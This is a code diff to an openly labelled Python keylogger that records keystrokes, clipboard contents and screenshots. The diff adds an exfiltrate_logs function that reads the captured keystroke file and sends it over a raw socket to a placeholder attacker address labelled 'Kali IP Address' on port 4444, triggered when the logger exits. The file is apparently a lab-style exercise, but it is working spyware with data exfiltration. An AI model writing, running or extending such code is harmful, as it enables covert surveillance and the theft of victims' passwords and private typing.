@@ -9,6 +9,25 @@ from datetime import datetime
 from threading import Timer
 import shutil
 import sys
+import socket
+
+def exfiltrate_logs(ip="Kali IP Address", port=4444):
+    try:
+        log_path = os.path.join(log_dir, "keylogs.txt")
+        with open(log_path, "rb") as file:
+            data = file.read()
+
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((ip, port))
+        s.sendall(data)
+        s.close()
+
+        logging.info(f"[Exfil] Sent logs to {ip}:{port}")
+    except Exception as e:
+        logging.warning(f"[Exfil] Failed to send logs: {e}")
+print("Sending logs...")
+
+
 
 # === Setup ===
 log_dir = os.path.join(os.getcwd(), "logs")
@@ -49,7 +68,6 @@ def periodic_tasks():
     log_clipboard()
     capture_screenshot()
     Timer(60, periodic_tasks).start()  # repeat every 60 seconds
-
 # === Key Logger ===
 def on_press(key):
     global last_window, last_key
@@ -64,12 +82,15 @@ def on_press(key):
     try:
         if last_key == 'q' and key.char == 'q':
             logging.info("[Exit on double 'q']")
+            exfiltrate_logs()
             os._exit(0)
+
         last_key = key.char
         logging.info(f"{key.char}")
     except AttributeError:
         logging.info(f"[{key}]")
         last_key = None  # reset if not a character key
+
 
 # === Start Logging ===
 logging.info("=== Keylogger Started ===")
@@ -93,3 +114,4 @@ periodic_tasks()
 
 with keyboard.Listener(on_press=on_press) as listener:
     listener.join()
+
